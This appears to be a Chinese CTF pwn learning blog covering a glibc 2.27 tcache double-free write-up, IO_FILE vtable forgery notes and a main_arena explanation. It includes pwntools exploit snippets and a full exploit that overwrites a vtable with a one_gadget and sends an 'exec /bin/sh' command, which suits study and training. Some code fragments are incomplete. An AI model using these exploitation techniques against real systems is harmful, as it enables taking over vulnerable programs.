<p>网上wp都是神仙写的，一点也不萌新友好。我都看不懂（）</p>
<p>打开题发现这个菜单题好常规。</p>
<p>但是libc是2.27，难度会稍微高一点。而且这个2.27是魔改过的，加入了2.29才有的key，为Tcache加入了检查机制。                                                                                                   具体的参考可以看<a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">glibc2.31下的新double free手法/字节跳动pwn题gun题解</a>。但是在这道题里面充其量算一个trick而不是核心考点。</p>
<h2 id="1）漏洞点"><a href="#1）漏洞点" class="headerlink" title="1）漏洞点"></a>1）漏洞点</h2><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+0h] [rbp-18h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-10h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  __printf_chk(<span class="hljs-number">1LL</span>, <span class="hljs-string">&quot;Index: &quot;</span>);<br>  __isoc99_scanf(&amp;number, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( !v1 &amp;&amp; buf )<br>    <span class="hljs-built_in">free</span>(buf);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>漏洞点。经典uaf。</p>
<p>之前看wp有人说edit函数里面有空字节溢出，问题大概出在++v == v1上，正确写法应该是v0++，不然判断结束但是v0多加了一次。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        &#123;<br>          read(<span class="hljs-number">0</span>, v0, <span class="hljs-number">1uLL</span>);<br>          <span class="hljs-keyword">if</span> ( *v0 == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-keyword">if</span> ( ++v0 == v1 )<br>            <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>        &#125;<br>        *v0 = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>

<p>然后有一个比较怪的点就是这里的 <code> __readfsqword();</code>。很明显他是一个和读取有关的函数，但是ida根本点不进去。</p>
<p>后面我才知道这个函数是和canary保护有关。</p>
<p>根据微软官方文档<a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readfsbyte-readfsdword-readfsqword-readfsword?view=msvc-160">…</a>这个函数的功能是【通过FS段开头的偏移来读取内存中的数据】，这里的FS段是段寄存器。定义大概是运行时被赋予功能，然后在64位win下指向运行中的os的被定义的结构，被os用来加载特定线程段内存数据。</p>
<p>但是好像说了和没说一样。</p>
<p>回到汇编语言的界面，似乎找到点不进去的原因了。具体的内容还是要码住。<a href="https://toutiao.io/posts/o5yed8w/preview">Canary安全机制原理实战分析</a></p>
<p>![image-20210811161707509](/Users/rin/Library/Application Support/typora-user-images/image-20210811161707509.png)</p>
<h2 id="2）漏洞利用"><a href="#2）漏洞利用" class="headerlink" title="2）漏洞利用"></a>2）漏洞利用</h2><h3 id="1）Tcache-double-free"><a href="#1）Tcache-double-free" class="headerlink" title="1）Tcache double free"></a>1）Tcache double free</h3><p>之前也说过了，这个libc是魔改过的，增加了2.29才有的key，所以需要绕过。</p>
<p>虽然但是，我连普通的Tcache的题都不太清楚，正好找到一个讲得特别详细的视频，那就跟着做好了，顺便复习一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">0</span>)<br>gdb.attach(p)<br>pause()<br></code></pre></td></tr></table></figure>



<p>首先先分配再释放一下，看看这个题具体的内存分布有什么特点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs c#">pwndbg&gt; hea<br>Allocated chunk | PREV_INUSE<br>Addr: 0x55e9c994c000<br>Size: 0x251<br><br>Free chunk (tcache) | PREV_INUSE<br>Addr: 0x55e9c994c250<br>Size: 0x71<br>fd: 0x00<br><br>Top chunk | PREV_INUSE<br>Addr: 0x55e9c994c2c0<br>Size: 0x20d41<br><br>pwndbg&gt; bin<br>tcachebins<br>0x70 [  1]: 0x55e9c994c260 ◂— 0x0<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br><br></code></pre></td></tr></table></figure>

<p>之前一直不是很清楚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x55e9c994c000</span><br>Size: <span class="hljs-number">0x251</span><br></code></pre></td></tr></table></figure>

<p>这个堆块的作用，之前问学委，学委说是一些被缓存的函数啥的？？实际上是tcache的控制区域。大概就是保存Tcache chunk的一些信息。</p>
<p>然后这边</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x70</span> [  <span class="hljs-number">1</span>]: <span class="hljs-number">0x55e9c994c260</span> ◂— <span class="hljs-number">0x0</span> <span class="hljs-comment">//说明0x70大小的Tcache里只有一个Tcache chunk，</span><br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">300</span>gx <span class="hljs-number">0</span>x<span class="hljs-number">562</span>fcfd<span class="hljs-number">39000</span><br><span class="hljs-attribute">0x562fcfd39000</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000251</span><br><span class="hljs-attribute">0x562fcfd39010</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000010000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39020</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39030</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39040</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39050</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39060</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39070</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000562</span>fcfd<span class="hljs-number">39260</span><br><br></code></pre></td></tr></table></figure>

<p>这是控制堆块的部分结构</p>
<p><code>0x562fcfd39010:    0x0000010000000000    0x0000000000000000</code>中，1说明只有一个Tcache。</p>
<p>T擦车堆块的首地址也记录在内。从<code>0x562fcfd39050</code>开始分别记录0x20到0x70的Tcache chunk的首地址，比如<code>0x562fcfd39070:    0x0000000000000000    0x0000562fcfd39260</code>,记录的就是0x70大小chunk的首地址。</p>
<blockquote>
<p>喜闻乐见地被一个奇怪的知识点带偏了，大概就是setvbuf在pwn题中的原理。其实这个也是不陌生的一个概念了，但是一直没有深究，有机会可以写一篇文章探讨一下。</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">20</span>gx <span class="hljs-number">0</span>x<span class="hljs-number">56533012</span>f<span class="hljs-number">250</span><br><span class="hljs-attribute">0x56533012f250</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000071</span><br><span class="hljs-attribute">0x56533012f260</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">000056533012</span>f<span class="hljs-number">010</span><br></code></pre></td></tr></table></figure>

<p>我们到Tcache的地址中看一看，会发现<code>0x56533012f260:    0x0000000000000000    0x000056533012f010</code>处的<code>0x000056533012f010</code>，这是一个key值。</p>
<h4 id="2-29下Tcahce-double-free的检测"><a href="#2-29下Tcahce-double-free的检测" class="headerlink" title="2.29下Tcahce double free的检测"></a>2.29下Tcahce double free的检测</h4><p>之前也说过在2.29中新增了对于Tcahce double free的检测，也就是这里的key。检测的大致思路是</p>
<p>对于每一个tcache中的chunk，增加了一个key指针，用于指向所属的tcache结构体(也就是修改的原本只有一行的tcache_entry)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span>  <span class="hljs-comment">//链表指针，对应chunk中的fd字段</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span>  <span class="hljs-comment">//指向所属的tcache结构体，对应chunk中的bk字段</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>



<p>也就是所谓的key对应的就是chunk的bk字段。</p>
<p>当chunk被free，放入Tcache链表时，操作如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"> <br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span><span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);<br> <br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;  <span class="hljs-comment">//设置所属的tcache</span><br> <br>  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="hljs-comment">//单链表头插法</span><br>  tcache-&gt;entries[tc_idx] = e;  <br> <br>  ++(tcache-&gt;counts[tc_idx]); <span class="hljs-comment">//计数增加</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后进行free操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(size);<br><span class="hljs-comment">//只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查</span><br><span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>  <span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>  tcache_entry *e = (tcache_entry *)chunk2mem(p);<br> <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来</span><br><span class="hljs-comment">    如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="hljs-comment">//剪枝</span><br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE(memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>        malloc_printerr(<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>  &#125;<br> <br>  <span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="hljs-comment">//通过检查，放入tcahce中</span><br>  &#123;<br>    tcache_put(p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>源码太长不看，其实就是bk位相当于一个key。如果double free了就会报错。绕过方式就是把这个bk位改成其他的东西。比较简单。所以我们可以通过edit绕过这个检测。</p>
<p>大致是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x78</span>)<br>free(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;aaaa&quot;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<p>再进行接收，就能获取一个我们的堆地址。接着就能算出堆基址。</p>
<p>然后我们需要构造出unsortedbin chunk、</p>
<p>但是题目限制了分配堆块的大小，我们无法直接获得一个unsortedbin chunk。。</p>
<p>那么有什么办法能构造出unsortedbin呢？<br>回到Tcache的控制堆块，并且想到我们存在的double free，我们是否能通过double free来造成Tcache的控制堆块的任意写然后来修改被控制的Tcache的信息？比如数量和地址和大小？</p>
<p>如果我们把数量改成七，大小改成我们想要的其他的，然后再将其申请并释放，我们是不是就可以获得unsortedbin chukn了？</p>
<p>然后可以直接通过unsortedbin中的地址来减去偏移获得libc基址，然后直接one_gadget打malloc_hook。</p>
<p>总体的利用思路是比较常规的，尤其是获得unsortedbin的地址之后的操作基本上就是模版化。</p>
<p>然后比较关键的就是前面对于Tcache 检测的绕过以及修改Tcache控制区域来构造unsorted’bin。</p>
<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>接下来是具体的调试部分，我力争把每道题都完整地调出来，只清楚原理不能实战是没有任何意义的。</p>
<p>但是我们首先就是要解决libc的问题。虽然我们已经找到解决问题的方法，但是中途是否会出现其他的问题这个还不得而知。</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://blog.csdn.net/A951860555/article/details/116910945">2021第十四届全国大学生信息安全竞赛WP（CISCN）– pwn部分</a></p>
<p><a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">glibc2.31下的新double free手法/字节跳动pwn题gun题解</a></p>
<p><a href="https://www.bilibili.com/video/BV1Sy4y1W7h2">CISCN2021 lonelywolf</a></p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE学习</title>
    <url>/2021/08/09/io_file/</url>
    <content><![CDATA[<p>io_file学习笔记</p>
<h3 id="0）review"><a href="#0）review" class="headerlink" title="0）review"></a>0）review</h3><p>glibc定义了<code>_IO_FILE</code>这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的<code>_IO_FILE_plus</code>结构</p>
<p>结构源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个结构包含了一个叫<code>vtable</code>的指针，指向实现io函数各种功能的真正函数。</p>
<p>以fread为例子简述io_file结构调用的流程</p>
<h4 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h4><p>fread真正功能的实现在子函数<code>_IO_sgetn</code>中。</p>
<p>下面是<code>_IO_sgetn</code>的源码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_sgetn (fp, data, n)<br>     _IO_FILE *fp;<br>     <span class="hljs-keyword">void</span> *data;<br>     _IO_size_t n;<br>&#123;<br>  <span class="hljs-keyword">return</span> _IO_XSGETN (fp, data, n);<br>&#125;<br></code></pre></td></tr></table></figure>



<p>实际上也是先定义一堆变量然后内部再调用另外一个函数。</p>
<p>也就是<code>_IO_XSGETN</code>。</p>
<p>这个函数并不简单，它是<code>_IO_FILE_plus.vtable</code> 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p>
<p>vtable也是一个指针，指向结构体<code>_IO_jump_t</code></p>
<p><code>_IO_jump_t</code>源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>这里vtable就像一个中转站，通过它调用<code>_IO_jump_t</code>中的各种函数。</p>
<p>比如说这里fread就是调用的<code>_IO_file_xsgetn</code>函数。</p>
<p>值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>        &amp;&amp; want &lt; (<span class="hljs-keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>      &#123;<br>        <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br>      <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br></code></pre></td></tr></table></figure>



<p>函数源码如上，实现的是一个键盘输入。 </p>
<p>实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。</p>
<h3 id="伪造vtable"><a href="#伪造vtable" class="headerlink" title="伪造vtable"></a>伪造vtable</h3><p>在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。</p>
<p>那么应该如何伪造vtable呢？<br>目前有两种思路。</p>
<p>一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。</p>
<p>在libc2.23以后的版本vtable不能被直接写入数据，所以只能用第二种方法–伪造vtable。</p>
<p>但是我们先从第一个方法来试一试。</p>
<p>示例来源于ctf-wiki</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *fp;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *vtable_ptr;<br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    vtable_ptr=*(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//get vtable</span><br><br>    vtable_ptr[<span class="hljs-number">7</span>]=<span class="hljs-number">0x41414141</span> <span class="hljs-comment">//xsputn</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call 0x41414141&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这边利用的具体步骤比较直观。</p>
<p>遍历 <code>_IO_list_all</code> ，然后调用 <code>_IO_2_1_stdout_</code> 下的 <code>vtable</code> 中 <code>_setbuf</code> 函数。</p>
<p>承接上文的思路，我们需要在某个可控内存伪造vtable，然后修改_setbuf函数为关键内容。</p>
<p>在这道题中，我们可以在vtable附近修改两个字节构造fake vtable，然后利用三个字节改_setbuf为one_gadget。</p>
<p>开头直接给出了sleep函数的真实地址，程序内存地址完全暴露，我们可以通过它找到exit调用的stdout的地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; <span class="hljs-built_in">print</span> _IO_2_1_stdin_<br><span class="hljs-variable">$2</span> = &#123;<br>  file = &#123;<br>    _flags = -72540024, <br>    _IO_read_ptr = 0x0, <br>    _IO_read_end = 0x0, <br>    _IO_read_base = 0x0, <br>    _IO_write_base = 0x0, <br>    _IO_write_ptr = 0x0, <br>    _IO_write_end = 0x0, <br>    _IO_buf_base = 0x0, <br>    _IO_buf_end = 0x0, <br>    _IO_save_base = 0x0, <br>    _IO_backup_base = 0x0, <br>    _IO_save_end = 0x0, <br>    _markers = 0x0, <br>    _chain = 0x0, <br>    _fileno = 0, <br>    _flags2 = 0, <br>    _old_offset = -1, <br>    _cur_column = 0, <br>    _vtable_offset = 0 <span class="hljs-string">&#x27;\000&#x27;</span>, <br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>, <br>    _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;, <br>    _offset = -1, <br>    _codecvt = 0x0, <br>    _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;, <br>    _freeres_list = 0x0, <br>    _freeres_buf = 0x0, <br>    __pad5 = 0, <br>    _mode = 0, <br>    _unused2 = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="hljs-built_in">times</span>&gt;<br>  &#125;, <br>  vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>我们可以看到vtable的地址是0x7ffff7dca2a0。</p>
<p>然后我们需要在它附近伪造一个vtable。</p>
<ol>
<li>伪造的vtable需要符合以下条件：<br>1:<code>fake_vtable + 0x58</code>=<code>libc_base+off_3</code></li>
</ol>
<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)<br>p = process(<span class="hljs-string">&#x27;the_end&#x27;</span>)<br><br>libc_base = long(sleep_ad,<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">&#x27;sleep&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0xf02b0</span><br>vtables =     libc_base + <span class="hljs-number">0x3C56F8</span><br><br>fake_vtable = libc_base + <span class="hljs-number">0x3c5588</span><br>target_addr = libc_base + <span class="hljs-number">0x3c55e0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>    p.send(p64(vtables+i))<br>    p.send(p64(fake_vtable)[i])<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    p.send(p64(target_addr+i))<br>    p.send(p64(one_gadget)[i])<br><br>p.sendline(<span class="hljs-string">&quot;exec /bin/sh 1&gt;&amp;0&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>伪造vtable算是io_file中比较简单好懂的一点了，只要对数据结构稍微熟悉一点就能很快理解。然后伪造的方式和思路也比较直接，可以说是经典pwn思路了////</p>
<p>下一章我们将学习FSOP，感觉难度会比伪造vtable高出不少，其实只要沉下心来看都不难，最难的目前来说还是那些高版本的防护的绕过了。</p>
<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>上一part我们学习了如何通过伪造vtable加上打one_gsdget来getshell，理解起来比较简单，实际操作也并不复杂，只要能找到fake vtable的位置并且正确理解one gadget的用法就好。</p>
<p>这一个part我们学习FSOP。</p>
<p>ps：不管是fsop还是后面的glibc2.24下的伪造vtable在ctf中的考察都较少。但是不能说不重要吧///</p>
<p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项</p>
]]></content>
      <tags>
        <tag>other</tag>
      </tags>
  </entry>
  <entry>
    <title>main_arena与多线程</title>
    <url>/2021/08/20/main_arana%20%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<p>在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下：</p>
<blockquote>
<p>Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。</p>
</blockquote>
<p>首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。</p>
<p>所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。</p>
<h4 id="加锁"><a href="#加锁" class="headerlink" title="加锁"></a>加锁</h4><p>当<strong>多个线程同时操作同一个共享全局变量</strong>的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。</p>
<h4 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h4><p>线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。</p>
<p>比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。</p>
<p>其中会有一个<code>main_arena</code>,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。</p>
<p>这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。</p>
<blockquote>
<p>在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。</p>
</blockquote>
<p>之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。</p>
<p>但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是<code>main_arena</code>而并不是什么<code>non_main_arena</code>。并且只有<code>main_arena</code>    能够访问<code>heap</code>段，<code>non_main_arena</code>只能访问<code>mmap</code>映射区域。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/24909781">malloc x 线程</a></p>
<p><a href="https://www.wangan.com/docs/1741">GLibcHeap</a></p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>patch&#39;alarm</title>
    <url>/2021/08/03/patch%20alarm/</url>
    <content><![CDATA[<p>比较弱智的一个操作，但是如果没注意到的话还是有一点点坑。</p>
<p>一般来说许多题都喜欢在main函数里加alarm。</p>
<p>alarm会导致调试的时候超时，如果没有解决的话基本不能调试。算最基础的的反调试手法了。</p>
